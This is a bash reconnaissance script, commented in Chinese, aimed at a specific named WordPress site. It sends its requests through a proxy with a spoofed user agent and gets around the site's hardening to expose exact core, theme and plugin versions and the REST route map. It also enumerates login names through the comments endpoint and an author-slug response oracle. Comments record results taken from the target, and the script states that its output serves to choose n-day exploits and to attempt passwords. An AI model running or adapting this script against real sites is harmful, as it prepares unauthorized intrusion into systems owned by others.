#!/usr/bin/env bash
# WordPress「加固站」版本 + 用户枚举缺口探测（匿名，只读）
# 适用前提：站点用 nginx 规则 403 掉了 readme.html / license.txt / 插件 readme.txt，
#           并封了 /wp-json/wp/v2/users 与 /?author=N，但下面这些路径常被漏堵。
# 出口：命令级代理（DO NOT 改本机网络配置）
#   PX=http://127.0.0.1:7892

TARGET="https://old.retro32.com"          # 换成目标站（去掉末尾斜杠）
PX="http://127.0.0.1:7892"                # 不需代理时置空并用 --noproxy '*'
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
CURL="curl -sk -x $PX -A $UA"

echo "=== 1. WP 核心版本：readme.html 被封时的替代（关键缺口）==="
$CURL "$TARGET/wp-links-opml.php" | head -20
# 判据：HTTP 200 且 body 含  <!-- generator="WordPress/<x.y.z>"  -->
$CURL -o /dev/null -w 'readme.html 对照: %{http_code} %{size_download}B\n' "$TARGET/readme.html"
#   对照实测: 403 1662B (nginx)  —— 站点想藏版本，却漏了 opml

echo "=== 2. 主题精确版本 ==="
$CURL "$TARGET/wp-content/themes/Divi/style.css" | head -20
# 判据：200 且 "Version: 4.27.9"（主题名按实际换）

echo "=== 3. 插件版本：首页静态资源 ?ver= + meta generator ==="
$CURL "$TARGET/" | grep -oE 'wp-content/(plugins|themes)/[^"]+\?ver=[0-9.]+'
$CURL "$TARGET/" | grep -oE '<meta name="generator" content="[^"]+"'
# 实测（old.retro32.com）:
#   wp-content/plugins/download-manager/assets/css/front.min.css?ver=3.3.76
#   wp-content/plugins/woocommerce/assets/css/woocommerce-layout.css?ver=11.2.2
#   wp-content/plugins/woocommerce-paypal-payments/.../mini-cart-buttons.css?ver=4.2.2
#   <meta name="generator" content="WordPress Download Manager 3.3.76" />
$CURL -o /dev/null -w '插件 readme.txt 对照: %{http_code} %{size_download}B\n' \
  "$TARGET/wp-content/plugins/woocommerce/readme.txt"
#   对照实测: 403 548B —— 真的版本还在静态串里

echo "=== 4. 未认证路由表（= 已装插件命名空间清单）==="
$CURL "$TARGET/wp-json/" | python3 -c \
 "import sys,json;d=json.load(sys.stdin);print('namespaces:',len(d['namespaces']),'routes:',len(d['routes']));[print(' -',n) for n in d['namespaces']]"
# 实测: 31 namespaces / 819 routes: wpdm, wc/v3, wordfence/v1, yoast/v1, jetpack/v4,
#       wp-mail-smtp/setup-wizard/v1, carbon-fields/v1, wccom-site/v3 ...

echo "=== 5. 用户枚举（users 端点被封时的两条替代）==="
# 5a 先确认标准口被封（对照组）
$CURL -o /dev/null -w 'wp/v2/users      : %{http_code}\n' "$TARGET/wp-json/wp/v2/users?per_page=100"
$CURL -o /dev/null -w '?author=1         : %{http_code}\n' "$TARGET/?author=1"
#   实测: 401 (rest_user_cannot_view) / 403

# 5b 替代一：comments 端点匿名可读，直接给 author id + 显示名
$CURL "$TARGET/wp-json/wp/v2/comments?per_page=100" | python3 -c \
 "import sys,json;[print('author_id=%s name=%s'%(c['author'],c['author_name'])) for c in json.load(sys.stdin)]"
#   实测: author_id=2 name=Retro32UK

# 5c 替代二：/author/<slug>/ 的 301(有效) vs 404(无效) 差分 oracle
for s in retro32 marke peter zzzqrandomzzq; do
  printf 'author/%-16s -> ' "$s"
  $CURL -o /dev/null -w '%{http_code}\n' "$TARGET/author/$s/"
done
#   实测: retro32 -> 301 (location:/author/retro32, x-redirect-by:WordPress)
#         GET /author/retro32 -> 200 <title>Retro32UK, Author at Retro32</title> class="author-2"
#         zzzqrandomzzq -> 404
#   注意：/author/<slug>/ 带尾斜杠会被 WP 301 规范化到 /author/<slug>（去掉尾斜杠），
#        所以要看正文需 curl -L 或直接请求不带尾斜杠的变体。

# 产出: 精确版本号（选 n-day）+ 精确登录名 slug（口令验证用）。
